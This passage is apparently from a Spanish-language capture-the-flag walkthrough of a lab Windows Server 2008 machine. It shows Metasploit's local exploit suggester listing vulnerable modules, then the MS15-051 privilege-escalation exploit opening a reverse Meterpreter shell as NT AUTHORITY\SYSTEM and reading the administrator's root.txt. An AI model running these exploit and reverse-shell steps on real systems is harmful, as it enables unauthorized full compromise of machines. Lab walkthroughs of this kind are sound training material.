[*] 192.168.1.80 - Collecting local exploits for x86/windows...
[*] 192.168.1.80 - 203 exploit checks are being tried...
[+] 192.168.1.80 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Windows Windows Server 2008 build detected!
[+] 192.168.1.80 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 192.168.1.80 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 192.168.1.80 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 192.168.1.80 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 192.168.1.80 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 192.168.1.80 - Valid modules for session 1:
============================
.
 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Windows Windows Server 2008 build detected!
 2   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 3   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
...
...
...
```
Tenemos varias opciones, pero el que sirve para escalar privilegios es el módulo `exploit/windows/local/ms15_051_client_copy_image`.

Vamos a configurarlo:
```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_image
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms15_051_client_copy_image) > set SESSION 1
SESSION => 1
```

Y lo ejecutamos:
```bash
msf6 exploit(windows/local/ms15_051_client_copy_image) > exploit
[*] Started reverse TCP handler on Tu_IP:4444 
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching msiexec to host the DLL...
[+] Process 1460 launched.
[*] Reflectively injecting the DLL into 1460...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 192.168.1.80
[*] Meterpreter session 2 opened (Tu_IP:4444 -> 192.168.1.80:49188) at 2025-02-03 21:34:00 -0600
.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
De esta forma, volvimos a escalar privilegios.

Ya solo obtenemos la flag del administrador:
```batch
C:\Windows\System32>cd C:\Users\Administrador\Desktop
cd C:\Users\Administrador\Desktop
.
C:\Users\Administrador\Desktop>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 1CEF-5C5A
.
 Directorio de C:\Users\Administrador\Desktop
.
14/06/2024  17:17    <DIR>          .
14/06/2024  17:17    <DIR>          ..
14/06/2024  17:16                29 root.txt
               1 archivos             29 bytes
               2 dirs  12.669.628.416 bytes libres
.
C:\Users\Administrador\Desktop>type root.txt
type root.txt
```
Y con esto, completamos la máquina.
